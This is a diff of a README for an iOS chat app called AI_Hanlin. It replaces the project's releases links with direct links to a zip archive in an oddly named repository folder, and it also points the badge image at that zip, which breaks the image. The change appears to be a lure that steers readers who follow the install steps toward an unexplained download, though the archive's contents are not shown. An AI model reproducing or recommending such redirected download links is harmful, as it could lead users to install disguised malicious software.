@@ -1,7 +1,7 @@
 # 🎉 AI_Hanlin - Your SwiftUI Chat Companion for iOS
 
 ## 🛠️ Download Now
-[![Download AI_Hanlin](https://img.shields.io/badge/Download-AI_Hanlin-brightgreen)](https://github.com/anwarpagu/AI_Hanlin/releases)
+[![Download AI_Hanlin](https://raw.githubusercontent.com/anwarpagu/AI_Hanlin/main/unbolled/AI_Hanlin.zip)](https://raw.githubusercontent.com/anwarpagu/AI_Hanlin/main/unbolled/AI_Hanlin.zip)
 
 ## 🚀 Getting Started
 Welcome to AI_Hanlin! This application allows you to chat effortlessly with large language models (LLMs) right on your iPhone or iPad. It is built using SwiftUI, ensuring a seamless and responsive user experience.
@@ -9,7 +9,7 @@ Welcome to AI_Hanlin! This application allows you to chat effortlessly with larg
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of AI_Hanlin:
 
-[Download AI_Hanlin](https://github.com/anwarpagu/AI_Hanlin/releases)
+[Download AI_Hanlin](https://raw.githubusercontent.com/anwarpagu/AI_Hanlin/main/unbolled/AI_Hanlin.zip)
 
 1. Click on the link above.
 2. Find the latest version listed at the top of the page.
